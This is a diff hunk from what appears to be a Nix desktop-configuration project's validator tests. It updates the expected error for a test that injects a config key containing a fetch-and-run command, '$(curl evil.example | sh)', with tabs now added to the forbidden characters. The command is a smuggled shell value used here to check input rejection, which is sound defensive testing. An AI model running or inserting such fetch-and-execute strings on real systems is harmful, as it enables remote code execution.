@@ -2299,7 +2299,7 @@
             test/desktops/non-attrset.nix: does not evaluate to a set of settings — a desktop is { haus = { … }; }
             test/desktops/priority-instruction.nix: haus.ui.scale may not carry a merge or priority instruction — a desktop states values, and the host is what outranks them
             test/desktops/scene-name.nix: haus.focus.scenes.deep work is not a plain scene name
-            test/desktops/shell-in-free-key.nix: haus.bar.media.icons.Music"; $(curl evil.example | sh); " may not contain quotes, backslashes, `$`, backticks or newlines
+            test/desktops/shell-in-free-key.nix: haus.bar.media.icons.Music"; $(curl evil.example | sh); " may not contain quotes, backslashes, `$`, backticks, newlines or tabs
             test/desktops/stray-key.nix: sets `launchd` outside `haus`, and a desktop may set nothing else
             test/desktops/unknown-option.nix: haus.theme.accentColour is not a haus option
           '';
